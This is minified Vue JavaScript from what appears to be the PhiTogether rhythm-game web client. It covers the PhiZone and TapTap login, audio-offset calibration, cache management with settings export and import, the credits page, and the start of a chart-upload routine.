e.nativeApi&&e.nativeApi?(e.nativeApi.loginWithTapTap(),new Promise((t,n)=>{shared$1.game.loginWithTapTapCallback=s=>{s?t(s):n(void 0)}})):Promise.reject()}},_imports_0$2="/src/core/loginWithTapTap.png",login_vue_vue_type_style_index_0_lang="",_sfc_main$c={name:"login",data(){return{username:"",password:"",taptapAvailable:!1,taptapToBind:null,taptapTapped:!1}},mounted(){this.taptapAvailable=window.nativeApi&&window.nativeApi.loginWithTapTap},methods:{jumpReg(){location.href="https://www.phi.zone/session/register?redirect="+encodeURIComponent(location.href)},async doLogin(){const e=shared$1.game.msgHandler;if(!this.username||!this.password){e.sendMessage(this.$t("login.usernameAndPasswordCantBeEmpty"),"error");return}e.sendMessage(this.$t("login.loggingin")),PhiZoneAPI.refreshLogin(this.password,"password",this.username).then(t=>{shared$1.game.ptmain.gameConfig.account.tokenInfo=t,shared$1.game.ptmain.loadUserRelatedInfo(t.access_token).then(async()=>{this.taptapToBind?await e.confirm(this.$t("login.askTapTapBinding",{username:this.taptapToBind.name}))?(e.sendMessage(this.$t("login.bindingTapTap")),PhiZoneAPI.bindTapTap(t.access_token,this.taptapToBind.unionId).then(n=>{e.sendMessage(this.$t("login.bindTapTapSuccess"),"success",!0),this.$router.back()}).catch(()=>{e.sendMessage(this.$t("login.bindTapTapFailure"),"error",!0)})):this.$router.back():this.$router.back()}).catch(()=>{})}).catch(t=>{shared$1.game.loadHandler.r(),e.failure(t)})},async loginWithTapTap(){if(this.taptapTapped)return;this.taptapTapped=!0;const e=shared$1.game.msgHandler;await TapTapApi.loginWithTapTap().then(t=>{e.sendMessage(this.$t("login.loggingin")),PhiZoneAPI.refreshLogin(t.accessToken,"password",t.macKey,!0).then(n=>{this.$router.back(),shared$1.game.ptmain.gameConfig.account.tokenInfo=n,shared$1.game.ptmain.loadUserRelatedInfo(n.access_token).catch(()=>{})}).catch(()=>{e.failure(this.$t("login.noTapTapBinding")),this.taptapToBind=t,this.taptapAvailable=!1})}).catch(()=>{}),this.taptapTapped=!1}}},_hoisted_1$c={id:"loginPage",class:"routerRealPage"},_hoisted_2$b=createBaseVNode("h1",{class:"loginPageRow",style:{"font-size":"2em"}},"使用 PhiZone 账号登录",-1),_hoisted_3$b={class:"loginPageRow"},_hoisted_4$a={class:"loginPageRow"},_hoisted_5$a={class:"loginPageRow"},_hoisted_6$a=["value"],_hoisted_7$9=["value"],_hoisted_8$9={key:0,class:"loginPageRow",style:{"font-size":"2em"}},_hoisted_9$8={class:"loginPageRow"};function _sfc_render$c(e,t,n,s,r,o){return openBlock(),createElementBlock("div",_hoisted_1$c,[_hoisted_2$b,createBaseVNode("div",_hoisted_3$b,[createTextVNode(toDisplayString$1(e.$t("login.email"))+"：",1),withDirectives(createBaseVNode("input",{class:"input textInput",style:{width:"calc(100%/2)"},"onUpdate:modelValue":t[0]||(t[0]=l=>r.username=l),autocomplete:"username"},null,512),[[vModelText,r.username]])]),createBaseVNode("div",_hoisted_4$a,[createTextVNode(toDisplayString$1(e.$t("login.passwd"))+"：",1),withDirectives(createBaseVNode("input",{class:"input textInput","onUpdate:modelValue":t[1]||(t[1]=l=>r.password=l),style:{width:"calc(100%/2)"},type:"password",autocomplete:"current-password",onKeyup:t[2]||(t[2]=withKeys((...l)=>o.doLogin&&o.doLogin(...l),["enter"]))},null,544),[[vModelText,r.password]])]),createBaseVNode("div",_hoisted_5$a,[createBaseVNode("input",{type:"button",style:{width:"auto","font-size":"1.5em"},value:e.$t("login.signin"),onClick:t[3]||(t[3]=l=>o.doLogin())},null,8,_hoisted_6$a),createBaseVNode("input",{type:"button",style:{width:"auto","font-size":"1.5em"},value:e.$t("login.signup"),onClick:t[4]||(t[4]=l=>o.jumpReg())},null,8,_hoisted_7$9)]),r.taptapAvailable?(openBlock(),createElementBlock("h1",_hoisted_8$9,"使用 TapTap 快速登录")):createCommentVNode("",!0),createBaseVNode("div",_hoisted_9$8,[r.taptapAvailable?(openBlock(),createElementBlock("img",{key:0,src:_imports_0$2,style:{width:"10em"},onClick:t[5]||(t[5]=l=>o.loginWithTapTap()),alt:"Login With TapTap"})):createCommentVNode("",!0)])])}const LoginPageComponent=_export_sfc(_sfc_main$c,[["render",_sfc_render$c]]),calibrate_vue_vue_type_style_index_0_lang="",_sfc_main$b={name:"calibrate",data(){return{audiobuffer:null,bfs:null,actxStartTime:null,calibrateActx:null,forceExit:null}},mounted(){document.querySelector("#result1").innerText="-",document.querySelector("#result2").innerText="-",document.querySelector("#result3").innerText="-",document.querySelector("#result4").innerText="-",shared$1.game.msgHandler.sendMessage(this.$t("calibrate.loadFile"),"info",!1),fetch("/src/core/calibrate.mp3").then(e=>e.arrayBuffer()).then(e=>{shared$1.game.msgHandler.sendMessage(this.$t("calibrate.loadSuccess")),this.audiobuffer=e}).catch(()=>{shared$1.game.msgHandler.sendMessage(this.$t("calibrate.loadError"),"error")})},beforeUnmount(){this.forceExit=!0,this.bfs&&this.bfs.stop(),document.body.onkeydown=null},methods:{caliOnce(){const e=this.calibrateActx.currentTime-this.actxStartTime;var t=1;e>0&&e<=2&&(t=1),e>2&&e<=4&&(t=2),e>4&&e<=6&&(t=3),e>6&&e<=8&&(t=4);const n=document.querySelector("#result"+t);n&&(n.innerText=Math.round(1e3*(e-(2*t-1))))},caliStart(){document.getElementById("startBtn").blur(),this.calibrateActx=null,window.oggCompatible=!!new Audio().canPlayType("audio/ogg"),this.calibrateActx=new(window.oggCompatible?window.AudioContext||window.webkitAudioContext||window.mozAudioContext||window.msAudioContext:oggmented.OggmentedAudioContext),this.calibrateActx.decodeAudioData(this.audiobuffer,e=>{this.bfs=this.calibrateActx.createBufferSource(),this.bfs.buffer=e,this.bfs.connect(this.calibrateActx.destination),this.actxStartTime=this.calibrateActx.currentTime,this.bfs.start(0),document.body.onkeydown=this.caliOnce,this.bfs.addEventListener("ended",async()=>{if(this.forceExit)return;this.calibrateActx==null||this.calibrateActx.close(),this.calibrateActx=void 0,this.calibrateActx=null;const t=parseFloat(document.querySelector("#result1").innerText.replace("-","-0")),n=parseFloat(document.querySelector("#result2").innerText.replace("-","-0")),s=parseFloat(document.querySelector("#result3").innerText.replace("-","-0")),r=parseFloat(document.querySelector("#result4").innerText.replace("-","-0")),o=Math.round((t+n+s+r)/4);await shared$1.game.msgHandler.confirm(this.$t("calibrate.confirm",{c:o}))&&(shared$1.game.ptmain.gameConfig.inputOffset=o.toString()),shared$1.game.ptmain.$router.back()})},()=>{shared$1.game.msgHandler.sendMessage(this.$t("calibrate.decodeError"),"error")})}}},_hoisted_1$b={id:"caliContainer"},_hoisted_2$a={id:"calibrate"},_hoisted_3$a={class:"calititle"},_hoisted_4$9={class:"content"},_hoisted_5$9={class:"description"},_hoisted_6$9=createBaseVNode("br",null,null,-1),_hoisted_7$8=createStaticVNode('<div class="results"><div id="result1">-</div><div id="result2">-</div><div id="result3">-</div><div id="result4">-</div></div>',1),_hoisted_8$8={class:"footer"};function _sfc_render$b(e,t,n,s,r,o){return openBlock(),createElementBlock("div",_hoisted_1$b,[createBaseVNode("div",_hoisted_2$a,[createBaseVNode("div",_hoisted_3$a,toDisplayString$1(e.$t("calibrate.title")),1),createBaseVNode("div",_hoisted_4$9,[createBaseVNode("div",_hoisted_5$9,[createTextVNode(toDisplayString$1(e.$t("calibrate.description1")),1),_hoisted_6$9,createTextVNode(" "+toDisplayString$1(e.$t("calibrate.description2")),1)]),createBaseVNode("button",{id:"clickBtn",onClick:t[0]||(t[0]=l=>o.caliOnce()),class:normalizeClass({disabled:r.actxStartTime===null})},toDisplayString$1(e.$t("calibrate.click")),3),_hoisted_7$8]),createBaseVNode("div",_hoisted_8$8,[createBaseVNode("button",{id:"startBtn",onClick:t[1]||(t[1]=l=>o.caliStart()),class:normalizeClass({disabled:!r.audiobuffer||r.actxStartTime!==null})},toDisplayString$1(e.$t("calibrate.start")),3)])])])}const CalibratePageComponent=_export_sfc(_sfc_main$b,[["render",_sfc_render$b]]),cachemanage_vue_vue_type_style_index_0_lang="",_sfc_main$a={name:"cacheManage",data(){return{cacheList:[]}},async activated(){this.cacheList=await ptdb.chart.renderCacheList(),console.log(this.cacheList)},computed:{uiBlurPreference(){return!shared$1.game.ptmain.gameConfig.noUIBlur}},methods:{getDifficultyActual(e){return typeof e.difficulty=="string"?e.difficulty:e.difficulty===0?"?":e.difficulty.toFixed(1)},getFileNameGeneral(e){const t=e.split("/");return decodeURIComponent(t[t.length-1])},async deleteCache(e,t,n=!1){if(t==="song")await ptdb.chart.song.delete(e);else if(t==="chart")await ptdb.chart.chart.delete(e);else return;n||shared$1.game.msgHandler.sendMessage(this.$t("cacheManage.deletedSuccessfully")),this.cacheList=await ptdb.chart.renderCacheList()},async deleteCacheAll(e){if(e.id&&e.song&&await this.deleteCache(e.id,"song",!0),e.charts)for(let t=0;t<e.charts.length;t++)e.charts[t].id&&await this.deleteCache(e.charts[t].id,"chart",!0);shared$1.game.msgHandler.sendMessage(this.$t("cacheManage.deletedSuccessfully")),this.cacheList=await ptdb.chart.renderCacheList()},async clearAll(e){if(await shared$1.game.msgHandler.confirm(this.$t("cacheManage.confirmBeforeDeleteData"),this.$t("info.info"),this.$t("cacheManage.delete"),this.$t("info.cancel")))switch(e){case"charts":caches.delete("PTv0-Charts").then(async()=>{await indexedDB.deleteDatabase("PTv0"),location.reload()});break;case"self":caches.delete("PTv0-Main").then(()=>{location.reload(!0)});break;case"all":caches.delete("PTv0-Main").then(()=>{caches.delete("PTv0-Charts").then(()=>{caches.delete("PTv0-User").then(async()=>{await indexedDB.deleteDatabase("PTv0"),shared$1.game.msgHandler.success(this.$t("cacheManage.allDataDeleted"))})})});break}},exportUserData(){const e=JSON.stringify(localStorage.getItem("PhiTogetherSettings")),t=`${btoa(e)}${md5$1(e.replaceAll('"'," "))}`;shared$1.game.msgHandler.sendMessage("正在上传数据(实验性功能)");const n=new FormData;n.append("text",t);const s="xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(r){var o=Math.random()*16|0,l=r=="x"?o:o&3|8;return l.toString(16)});n.append("filename","UserProfile_"+s),fetch("https://api.phitogether.realtvop.eu.org/record/upload",{method:"POST",body:n}).then(r=>r.text()).then(r=>{shared$1.game.msgHandler.info(`请在其他设备中粘贴导入 若未复制成功请手动输入: ${s}`,"ID已复制"),navigator.clipboard&&navigator.clipboard.writeText(s)}).catch(function(r){shared$1.game.msgHandler.sendMessage(r,"error"),shared$1.game.msgHandler.sendMessage("上传失败,请重试","error"),console.log(r)})},importUserData(){shared$1.game.msgHandler.prompt("","输入配置ID").then(e=>fetch(`https://api.phitogether.realtvop.eu.org/record/uploaddownload/UserProfile_${e}`).then(t=>t.text()).then(t=>{const n=t.slice(0,-32),s=t.slice(-32);if(shared$1.game.msgHandler.confirm("确认覆盖配置?")){if(md5$1(n.replaceAll('"'," "))===s){const r=JSON.parse(n);localStorage.setItem("PhiTogetherSettings",r)}hared.game.msgHandler.info("配置已成功导入","导入成功")}}).fetch(t=>shared$1.game.msgHandler.sendMessage("配置导入失败","error")))}}},_hoisted_1$a={id:"cacheManage",class:"routerRealPage"},_hoisted_2$9=createBaseVNode("h3",null,"全部缓存管理",-1),_hoisted_3$9=createBaseVNode("br",null,null,-1),_hoisted_4$8=["onClick","value"],_hoisted_5$8={class:"cacheTable"},_hoisted_6$8={class:"chartListChartItem"},_hoisted_7$7={class:"file"},_hoisted_8$7={class:"type"},_hoisted_9$7={class:"play"},_hoisted_10$7={key:0,class:"chartListChartItem"},_hoisted_11$7={class:"file"},_hoisted_12$6={class:"type"},_hoisted_13$6={class:"play"},_hoisted_14$6=["onClick","value"],_hoisted_15$5={class:"chartListChartItem"},_hoisted_16$5={class:"file"},_hoisted_17$5={class:"type"},_hoisted_18$5={class:"play"},_hoisted_19$4=["onClick","value"];function _sfc_render$a(e,t,n,s,r,o){return openBlock(),createElementBlock("div",_hoisted_1$a,[createBaseVNode("div",{class:normalizeClass({cacheUnit:!0,blur:o.uiBlurPreference}),style:{padding:"10px"}},[_hoisted_2$9,createBaseVNode("input",{type:"button",value:"删除全部谱面",onClick:t[0]||(t[0]=l=>o.clearAll("charts"))}),createBaseVNode("input",{type:"button",value:"强制版本更新",onClick:t[1]||(t[1]=l=>o.clearAll("self"))}),_hoisted_3$9,createCommentVNode("",!0),createBaseVNode("input",{type:"button",value:"清空 PhiTogether 数据",onClick:t[3]||(t[3]=l=>o.clearAll("all"))}),createCommentVNode("",!0)],2),(openBlock(!0),createElementBlock(Fragment,null,renderList(r.cacheList,l=>(openBlock(),createElementBlock("div",{class:normalizeClass({cacheUnit:!0,blur:o.uiBlurPreference})},[createBaseVNode("h3",null,toDisplayString$1(e.$t("cacheManage.cachedFileTitle",[l.name?l.name:e.$t("cacheManage.separate")])),1),createBaseVNode("input",{type:"button",onClick:d=>o.deleteCacheAll(l),value:e.$t("cacheManage.deleteThisGroupOfFiles")},null,8,_hoisted_4$8),createBaseVNode("div",_hoisted_5$8,[createBaseVNode("div",_hoisted_6$8,[createBaseVNode("div",_hoisted_7$7,toDisplayString$1(e.$t("cacheManage.file")),1),createBaseVNode("div",_hoisted_8$7,toDisplayString$1(e.$t("cacheManage.type")),1),createBaseVNode("div",_hoisted_9$7,toDisplayString$1(e.$t("cacheManage.operation")),1)]),l.id&&l.song?(openBlock(),createElementBlock("div",_hoisted_10$7,[createBaseVNode("div",_hoisted_11$7,toDisplayString$1(o.getFileNameGeneral(l.song)),1),createBaseVNode("div",_hoisted_12$6,toDisplayString$1(e.$t("cacheManage.music_illustration")),1),createBaseVNode("div",_hoisted_13$6,[createBaseVNode("input",{type:"button",onClick:d=>o.deleteCache(l.id,"song"),value:e.$t("cacheManage.delete")},null,8,_hoisted_14$6)])])):createCommentVNode("",!0),(openBlock(!0),createElementBlock(Fragment,null,renderList(l.charts,d=>(openBlock(),createElementBlock("div",null,[createBaseVNode("div",_hoisted_15$5,[createBaseVNode("div",_hoisted_16$5,toDisplayString$1(o.getFileNameGeneral(d.chart)),1),createBaseVNode("div",_hoisted_17$5,toDisplayString$1(e.$t("cacheManage.chart"))+" "+toDisplayString$1(d.level)+" "+toDisplayString$1(o.getDifficultyActual(d)),1),createBaseVNode("div",_hoisted_18$5,[createBaseVNode("input",{type:"button",onClick:u=>o.deleteCache(d.id,"chart"),value:e.$t("cacheManage.delete")},null,8,_hoisted_19$4)])])]))),256))])],2))),256))])}const CacheManagePageComponent=_export_sfc(_sfc_main$a,[["render",_sfc_render$a]]),sponsors=["爱发电用户_106a8","爱发电用户_13809","泥竿孖","爱发电用户_006c7","奋斗的充电宝","想不出猩名字","爱发电用户_Q6My","中午ACE","虚","Dashysoo","小满1221","256ni","ZIHANG","洛","土豆上的绿芽","爱发电用户_072c1","三角形的五心","neonqwq","爱发电用户_tnHG","爱发电用户_bTF9","爱发电用户_39243","爱发电用户_bb79c","爱发电用户_52395","爱发电用户_pmvH","MLobster","玩家小顽皮","爱发电用户_NGew","爱发电用户_4605b","爱发电用户_NjmB"],_imports_0$1="/src/core/lg512y512.png",aboutpage_vue_vue_type_style_index_0_lang="",_sfc_main$9={name:"aboutpage",data(){return{ver:spec.thisVersion,vt:0,sponsors}},computed:{getLifeSpan(){let n=(new Date-new Date("March 11, 2023 20:20:00"))/1e3,s=Math.ceil(n)/86400;return this.$t("aboutPage.life",[Math.round(s)])}},methods:{}},_hoisted_1$9={id:"about",style:{width:"90%",margin:"0 auto","text-align":"left"}},_hoisted_2$8={style:{display:"flex","align-items":"center"}},_hoisted_3$8={style:{display:"block","line-height":"1.2em",width:"50%","margin-top":"-75px"}},_hoisted_4$7=createBaseVNode("img",{id:"aboutLogo",src:_imports_0$1,style:{"margin-top":"-40px",width:"inherit"}},null,-1),_hoisted_5$7=createBaseVNode("br",null,null,-1),_hoisted_6$7={style:{"font-size":"1.5em"}},_hoisted_7$6={style:{color:"grey","font-size":".85em","margin-top":"10px"}},_hoisted_8$6={style:{display:"block","line-height":"1.75em",width:"50%"}},_hoisted_9$6=createBaseVNode("div",{style:{height:"25px"}},null,-1),_hoisted_10$6=createBaseVNode("div",{style:{"font-size":"1.25em"}},[createTextVNode("Made by "),createBaseVNode("b",null,"Team PhiTogether"),createTextVNode(" with ❤️")],-1),_hoisted_11$6=createBaseVNode("br",null,null,-1),_hoisted_12$5=["innerHTML"],_hoisted_13$5=createBaseVNode("br",null,null,-1),_hoisted_14$5={style:{"font-size":"1.25em"}},_hoisted_15$4=createBaseVNode("br",null,null,-1),_hoisted_16$4={style:{"line-height":"1.5em"}},_hoisted_17$4=createBaseVNode("br",null,null,-1),_hoisted_18$4={style:{"font-size":"1.08em"}},_hoisted_19$3=createBaseVNode("a",{target:"_blank",href:"https://github.com/lchzh3473/sim-phi",style:{"font-weight":"bold",color:"midnightblue"}}," sim-phi ",-1),_hoisted_20$3=createBaseVNode("br",null,null,-1),_hoisted_21$3=createBaseVNode("a",{target:"_blank",href:"https://space.bilibili.com/274753872",style:{"font-weight":"bold",color:"midnightblue"}}," @lchzh3473 ",-1),_hoisted_22$3=createBaseVNode("a",{target:"_blank",href:"https://space.bilibili.com/295247346",style:{"font-weight":"bold",color:"midnightblue"}}," @HERO-科艺-P ",-1),_hoisted_23$3=createBaseVNode("br",null,null,-1),_hoisted_24$3=createBaseVNode("br",null,null,-1),_hoisted_25$3=createBaseVNode("br",null,null,-1),_hoisted_26$3=createBaseVNode("br",null,null,-1),_hoisted_27$3={style:{display:"flex"}},_hoisted_28$3={style:{display:"block","line-height":"1.75em","font-size":"120%",width:"50%"}},_hoisted_29$3=createBaseVNode("a",{target:"_blank",href:"https://space.bilibili.com/343672879",style:{"font-weight":"bold",color:"midnightblue"}}," 花降らし ",-1),_hoisted_30$3=createBaseVNode("br",null,null,-1),_hoisted_31$3=createBaseVNode("a",{target:"_blank",href:"https://space.bilibili.com/343672879",style:{"font-weight":"bold",color:"midnightblue"}}," hxWulgc ",-1),_hoisted_32$3=createBaseVNode("a",{target:"_blank",href:"https://space.bilibili.com/544365132",style:{"font-weight":"bold",color:"midnightblue"}}," 小翁同学 ",-1),_hoisted_33$3=createBaseVNode("a",{target:"_blank",href:"https://space.bilibili.com/484759721",style:{"font-weight":"bold",color:"midnightblue"}}," 飞机上的长电视 ",-1),_hoisted_34$3=createBaseVNode("a",{target:"_blank",href:"https://space.bilibili.com/472170134",style:{"font-weight":"bold",color:"midnightblue"}}," 星河 ",-1),_hoisted_35$2=createBaseVNode("br",null,null,-1),_hoisted_36$1=createBaseVNode("a",{target:"_blank",href:"https://space.bilibili.com/483612966",style:{"font-weight":"bold",color:"midnightblue"}}," 卡西_Quasimodo ",-1),_hoisted_37$1=createBaseVNode("a",{target:"_blank",href:"https://space.bilibili.com/544365132",style:{"font-weight":"bold",color:"midnightblue"}}," kev1nweng ",-1),_hoisted_38$1=createBaseVNode("a",{target:"_blank",href:"https://space.bilibili.com/484759721",style:{"font-weight":"bold",color:"midnightblue"}},[createTextVNode(" realtvop "),createBaseVNode("b",{style:{"font-size":"12px","padding-left":"2px","font-weight":"normal",color:"dimgrey"}},"(最拉垮)")],-1),_hoisted_39$1=createBaseVNode("br",null,null,-1),_hoisted_40$1=createBaseVNode("a",{target:"_blank",href:"https://space.bilibili.com/544365132",style:{"font-weight":"bold",color:"midnightblue"}},[createTextVNode(" kW "),createBaseVNode("b",{style:{"font-size":"12px","padding-left":"2px","font-weight":"normal",color:"dimgrey"}},"(已摆烂)")],-1),_hoisted_41$1=createBaseVNode("br",null,null,-1),_hoisted_42$1=createBaseVNode("a",{target:"_blank",href:"https://space.bilibili.com/343672879",style:{"font-weight":"bold",color:"midnightblue"}}," cgluWxh ",-1),_hoisted_43$1=createBaseVNode("br",null,null,-1),_hoisted_44$1=createBaseVNode("a",{target:"_blank",href:"https://space.bilibili.com/604608241",style:{"font-weight":"bold",color:"midnightblue"}}," 小白熊 ",-1),_hoisted_45$1=createBaseVNode("a",{target:"_blank",href:"https://space.bilibili.com/484759721",style:{"font-weight":"bold",color:"midnightblue"}},[createTextVNode(" 长电视下的飞机 "),createBaseVNode("b",{style:{"font-size":"12px","padding-left":"2px","font-weight":"normal",color:"dimgrey"}},"(逊了)")],-1),_hoisted_46$1=createBaseVNode("a",{target:"_blank",href:"https://space.bilibili.com/485913861",style:{"font-weight":"bold",color:"midnightblue"}},[createTextVNode(" 土豆上的绿芽 "),createBaseVNode("b",{style:{"font-size":"12px","padding-left":"2px","font-weight":"normal",color:"dimgrey"}},"(不可食用)")],-1),_hoisted_47$1=createBaseVNode("br",null,null,-1),_hoisted_48$1=createBaseVNode("br",null,null,-1),_hoisted_49$1=createBaseVNode("br",null,null,-1),_hoisted_50$1=createBaseVNode("br",null,null,-1),_hoisted_51$1=createBaseVNode("br",null,null,-1),_hoisted_52$1={style:{"font-size":"1.25em"}},_hoisted_53$1=createBaseVNode("br",null,null,-1),_hoisted_54$1=createBaseVNode("a",{target:"_blank",href:"https://phi.zone/",style:{"font-weight":"bold",color:"midnightblue"}}," PhiZone ",-1),_hoisted_55$1=createBaseVNode("a",{target:"_blank",href:"https://www.phigrim.cn/",style:{"font-weight":"bold",color:"midnightblue"}}," Phigrim ",-1),_hoisted_56$1=createBaseVNode("a",{target:"_blank",href:"https://www.phira.moe/",style:{"font-weight":"bold",color:"midnightblue"}}," Phira ",-1),_hoisted_57$1=createBaseVNode("br",null,null,-1),_hoisted_58$1=createBaseVNode("a",{target:"_blank",href:"https://starsriver.uotan.cn/",style:{"font-weight":"bold",color:"midnightblue"}}," 星河的博客 ",-1),_hoisted_59$1=createBaseVNode("a",{target:"_blank",href:"https://www.jizhiku.net/",style:{"font-weight":"bold",color:"midnightblue"}}," 机智库 ",-1),_hoisted_60$1={style:{display:"block","line-height":"1.75em",width:"50%","text-align":"justify"}},_hoisted_61$1={style:{"font-size":"1.25em"}},_hoisted_62$1=createBaseVNode("br",null,null,-1);function _sfc_render$9(e,t,n,s,r,o){return openBlock(),createElementBlock("div",_hoisted_1$9,[createBaseVNode("div",_hoisted_2$8,[createBaseVNode("div",_hoisted_3$8,[_hoisted_4$7,_hoisted_5$7,createBaseVNode("div",_hoisted_6$7,"PhiTogether "+toDisplayString$1(r.ver),1),createBaseVNode("div",_hoisted_7$6,toDisplayString$1(o.getLifeSpan),1)]),createBaseVNode("div",_hoisted_8$6,[_hoisted_9$6,_hoisted_10$6,_hoisted_11$6,createBaseVNode("div",{style:{"font-size":"1.25em"},innerHTML:e.$t("aboutPage.bio")},null,8,_hoisted_12$5),_hoisted_13$5,createBaseVNode("div",_hoisted_14$5,toDisplayString$1(e.$t("aboutPage.QQGuild")),1),_hoisted_15$4,createBaseVNode("div",_hoisted_16$4,toDisplayString$1(e.$t("aboutPage.supportus")),1),_hoisted_17$4,createBaseVNode("div",_hoisted_18$4,[createTextVNode("Based on "),_hoisted_19$3,_hoisted_20$3,createTextVNode(" Special thanks to "),_hoisted_21$3,createTextVNode("  "),_hoisted_22$3,_hoisted_23$3,_hoisted_24$3,createBaseVNode("b",null,toDisplayString$1(e.$t("aboutPage.relationshipWithPG")),1)])])]),_hoisted_25$3,_hoisted_26$3,createBaseVNode("div",_hoisted_27$3,[createBaseVNode("div",_hoisted_28$3,[createTextVNode(toDisplayString$1(e.$t("aboutPage.roles.projectCreator"))+"：",1),_hoisted_29$3,_hoisted_30$3,createTextVNode(" "+toDisplayString$1(e.$t("aboutPage.roles.developers"))+"：",1),_hoisted_31$3,createTextVNode(" | "),_hoisted_32$3,createTextVNode(" | "),_hoisted_33$3,createTextVNode(" | "),_hoisted_34$3,_hoisted_35$2,createTextVNode(" "+toDisplayString$1(e.$t("aboutPage.roles.gameArtist"))+"：",1),_hoisted_36$1,createTextVNode(" | "),_hoisted_37$1,createTextVNode(" | "),_hoisted_38$1,_hoisted_39$1,createTextVNode(" "+toDisplayString$1(e.$t("aboutPage.roles.soundDesigner"))+"：",1),_hoisted_40$1,_hoisted_41$1,createTextVNode(" "+toDisplayString$1(e.$t("aboutPage.roles.visualEffects"))+"：",1),_hoisted_42$1,_hoisted_43$1,createTextVNode(" "+toDisplayString$1(e.$t("aboutPage.roles.communityManager"))+"：",1),_hoisted_44$1,createTextVNode(" | "),_hoisted_45$1,createTextVNode(" | "),_hoisted_46$1,_hoisted_47$1,_hoisted_48$1,_hoisted_49$1,createTextVNode(" "+toDisplayString$1(e.$t("aboutPage.thanksToOther"))+" ",1),_hoisted_50$1,_hoisted_51$1,createBaseVNode("b",_hoisted_52$1,toDisplayString$1(e.$t("aboutPage.externalLinks")),1),_hoisted_53$1,_hoisted_54$1,createTextVNode("  |  "),_hoisted_55$1,createTextVNode("  |  "),_hoisted_56$1,_hoisted_57$1,_hoisted_58$1,createTextVNode("  |  "),_hoisted_59$1]),createBaseVNode("div",_hoisted_60$1,[createBaseVNode("b",_hoisted_61$1,toDisplayString$1(e.$t("aboutPage.sponsors")),1),_hoisted_62$1,createTextVNode(toDisplayString$1(r.sponsors.join(" | ")),1)])])])}const AboutPageComponent=_export_sfc(_sfc_main$9,[["render",_sfc_render$9]]),_sfc_main$8={name:"chartupload",data(){return{target:null,targetInfo:{name:"",level:"",difficulty:0,charter:""},extraResource:null}},computed:{uiUserPreference(){return!shared$1.game.ptmain.gameConfig.noUIBlur}},async mounted(){if(this.$route.query.target){const n=JSON.parse(sessionStorage.getItem("chartDetailsData")),s=JSON.parse(sessionStorage.getItem("loadedChart"));this.targetInfo.name=n.name,this.targetInfo.level=s.level,this.targetInfo.difficulty=s.difficulty,this.targetInfo.charter=s.charter,this.target=this.$route.query.target}shared$1.game.userChartUploaded=this.userChartUploaded,this.clearStatAll();const e=this,t=$id$2("extraResource");t.onchange=()=>{const n=t.files[0],s=new FileReader;s.readAsArrayBuffer(n),s.onload=r=>{e.extraResource=r.target.result}}},methods:{clearStatAll(){const e=$id$2("select-bg"),t=$id$2("select-bgm"),n=$id$2("select-chart"),s=$id$2("input-name"),r=$id$2("input-artist"),o=$id$2("input-charter"),l=$id$2("input-illustrator"),d=$id$2("select-difficulty"),u=$id$2("select-level");e.value=t.value=n.value="",s.value=this.$route.query.name||"",r.value=this.$route.query.composer||"",o.value=this.$route.query.charter||"",l.value=this.$route.query.illustrator||"",d.value=this.$route.query.level||"",u.value=this.$route.query.difficulty||"",shared$1.game.clearStat(),hook.uploader.reset(),$id$2("extraResource").value="",this.extraResource=null},async userChartUploaded(){$id$2("add_library").classList.remove("disabled");const e=$id$2("select-bg"),t=$id$2("select-bgm"),n=$id$2("select-chart"),s=$id$2("input-name"),r=$id$2("input-artist"),o=$id$2("input-charter"),l=$id$2("input-illustrator"),d=$id$2("select-difficulty"),u=$id$2("select-level");if(hook.chartsMD5.size>1&&shared$1.game.msgHandler.sendMessage(this.$t("userChartUpload.err.haveMultipleCharts"),"error"),!n.value)return shared$1.game.msgHandler.sendMessage(this.$t("userChartUpload.err.noChartSelected"),"error");if(!t.value)return shared$1.game.msgHandler.sendMessage(this.$t("userChartUpload.err.noSongSelected"),"error");if(!e.value)return shared$1.game.msgHandler.sendMessage(this.$t("userChartUpload.err.noImageSelected"),"error");if(s.value=this.$route.query.name||s.value,r.value=this.$route.query.composer||r.value,o.value=this.$route.query.charter||o.value,l.value=this.$route.query.illustrator||l.value,d.value=this.$route.query.level||d.value,u.value=this.$route.query.difficulty||u.value,!s.value||!r.value||!l.value||!o.value||!d.value||!u.value)if(await shared$1.game.msgHandler.confirm(this.$t("userChartEdit.askToFillWithUK")))s.value=s.value||"unknown",r.value=r.value||"unknown",l.value=l.value||"unknown",o.value=o.value||"unknown",d.value=d.value||"SP",u.value=u.value||"?";else return;if(this.$route.query.then==="playing")return sessionStorage.removeItem("loadedChart"),this.$router.replace({path:"/playing",query:{auto:1}});const f=hook.chartsMD5.get(hook.selectchart.value);if(this.target&&f!==this.target){shared$1.game.msgHandler.failure(this.$t("userChartUpload.fileDosentMatch",[f,this.target])),this.clearStatAll();return}const m=hook.oriBuffers.get(n.value),g=hook.oriBuffers.get(e.value),y=hook.oriBuffers.get(t.value),v={mp3:"audio/mpeg",mp4:"video/mp4",zip:"application/zip",ogg:"audio/ogg",m4a:"audio/mp4",png:"image/png",jpg:"image/jpeg",jpeg:"image/jpeg",tiff:"image/tiff",tif:"image/tiff"};let x="audio/mpeg",E="image/png",S=t.value.split("."),w=e.value.split(".");S=S[S.length-1],w=w[w.length-1],S in v&&(x=v[S]),w in v&&(E=v[w]),shared$1.game.loadHandler.l(this.$t("userChartUpload.saving"),"saveChart"),ptdb.chart.song.download({id:f,composer:r.value,illustrator:l.value,name:s.value},new Blob([y],{type:x}),new Blob([g],{type:E})).then(ptdb.chart.song.save).then(()=>ptdb.chart.chart.download({id:f,level:d.value,difficulty:u.value,charter:o.value,song:f},new Blob([m],{type:"application/json"}))).then(ptdb.chart.chart.save).then(()=>{if(this.target||shared$1.game.loadHandler.r("saveChart"),shared$1.game.msgHandler.sendMessage(this.$t("userChartUpload.success")),!this.target)this.$router.back();else{const k=()=>{const 